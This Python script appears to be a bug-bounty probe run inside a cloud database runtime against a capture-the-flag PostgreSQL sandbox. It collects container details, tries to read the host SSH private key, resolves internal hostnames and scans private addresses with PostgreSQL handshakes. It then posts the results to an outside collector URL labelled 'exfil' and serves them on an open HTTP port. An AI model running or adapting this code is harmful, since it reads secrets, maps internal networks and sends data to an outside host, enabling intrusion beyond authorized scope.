import json
import os
import socket
import ssl
import struct
import subprocess
import time
import urllib.request

CTF = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
CTF_PRIV = "10.1.8.115"
CTF_ULA = "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"
CTF_INTERNAL = "falcon-bug-bounty-flag-pgsql-dev-sandbox.i.aivencloud.com"
OUR_INTERNAL = "bb-probe-pg-1-bugcrowdninja-2a85.i.aivencloud.com"
COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime-v2"
R = {"probe": "aiven-runtime-internal-reach", "started": time.strftime("%FT%TZ", time.gmtime())}


def sh(cmd, limit=600):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=12)
        return (out.stdout + out.stderr).decode("utf-8", "replace")[:limit]
    except Exception as exc:                                        # noqa: BLE001
        return type(exc).__name__


def tcp(host, port, timeout=4.0, pg=False):
    res = {"target": "%s:%s" % (host, port)}
    s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        res["open"] = True
        res["ms"] = round((time.time() - t0) * 1000)
        if pg:
            s.sendall(struct.pack("!ii", 8, 80877103))
            reply = s.recv(1)
            res["pg_ssl_reply"] = reply.decode("latin1")
            if reply == b"S":
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    tls = ctx.wrap_socket(s, server_hostname=host if ":" not in host else None)
                    body = struct.pack("!i", 196608) + b"user\x00probe\x00database\x00defaultdb\x00\x00"
                    tls.sendall(struct.pack("!i", len(body) + 4) + body)
                    hdr = tls.recv(5)
                    if len(hdr) == 5:
                        mt = hdr[0:1].decode("latin1")
                        ml = struct.unpack("!i", hdr[1:5])[0]
                        payload = tls.recv(max(0, min(ml - 4, 512)))
                        res["pg_first_msg"] = mt
                        if mt == "R" and len(payload) >= 4:
                            res["pg_auth_code"] = struct.unpack("!i", payload[0:4])[0]
                        elif mt == "E":
                            res["pg_error"] = payload[4:200].decode("utf-8", "replace").replace("\x00", " ")
                except Exception as exc:                            # noqa: BLE001
                    res["pg_tls_err"] = type(exc).__name__
    except Exception as exc:                                        # noqa: BLE001
        res["open"] = False
        res["err"] = type(exc).__name__
    finally:
        try:
            s.close()
        except OSError:
            pass
    return res


# --- container posture (observation only) -----------------------------------
R["id"] = sh("id")
R["cgroup"] = sh("head -c 300 /proc/1/cgroup")
R["mounts"] = sh("head -12 /proc/mounts")
R["capabilities"] = sh("grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status")
R["podman_socket"] = sh("ls -la /run/podman/podman.sock /var/run/docker.sock 2>&1 | head -4")
R["devices"] = sh("ls /dev | head -20")
R["host_read_try"] = sh("head -c 80 /etc/ssh/ssh_host_ed25519_key 2>&1")
R["proc_host_hint"] = sh("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '")

# --- DNS: internal naming ---------------------------------------------------
R["dns"] = {}
for name in (CTF, CTF_INTERNAL, OUR_INTERNAL, "dev-sandbox.i.aivencloud.com",
             "falcon-bug-bounty-flag-pgsql.i.aivencloud.com", "aivencloud.com"):
    try:
        R["dns"][name] = socket.getaddrinfo(name, None)[0][4][0]
    except Exception as exc:                                        # noqa: BLE001
        R["dns"][name] = type(exc).__name__

# --- reachability of the sandbox's PRIVATE addresses, from inside Aiven -----
R["tcp"] = []
for host, port, pg in (
    (CTF_PRIV, 5432, True), (CTF_PRIV, 12691, True), (CTF_PRIV, 22, False),
    (CTF_ULA, 5432, True), (CTF, 12691, True), (CTF, 12692, True),
    (OUR_INTERNAL, 14857, True), (CTF_INTERNAL, 12691, True),
):
    R["tcp"].append(tcp(host, port, pg=pg))
    R["tcp"][-1]["pg"] = pg

R["finished"] = time.strftime("%FT%TZ", time.gmtime())
payload = json.dumps(R).encode()
try:
    req = urllib.request.Request(COLLECTOR, data=payload, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10).read()
except Exception:                                                   # noqa: BLE001
    pass
print(json.dumps(R, indent=1)[:6000], flush=True)

from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *_a):
        return


HTTPServer(("0.0.0.0", 8080), H).serve_forever()
